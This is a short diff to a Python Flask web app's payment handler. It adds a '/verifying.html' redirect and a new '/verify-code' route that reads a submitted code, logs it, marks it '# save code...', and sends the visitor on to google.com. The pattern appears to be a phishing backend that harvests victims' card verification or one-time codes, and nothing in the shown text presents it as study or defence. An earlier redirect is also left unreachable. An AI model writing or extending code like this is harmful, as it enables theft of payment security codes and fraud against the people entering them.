@@ -31,8 +31,18 @@ def process_payment():
     
 
     
-    time.sleep(3)
+    return redirect("/verifying.html") 
     return redirect("https://pay-76te.onrender.com/")
+
+@app.route("/verify-code", methods=["POST"])
+def verify_code():
+    code = request.form.get("code")
+    print("code:", code)
+    # save code...
+
+    return redirect("https://www.google.com")
+
+
     
 
 if __name__ == "__main__":
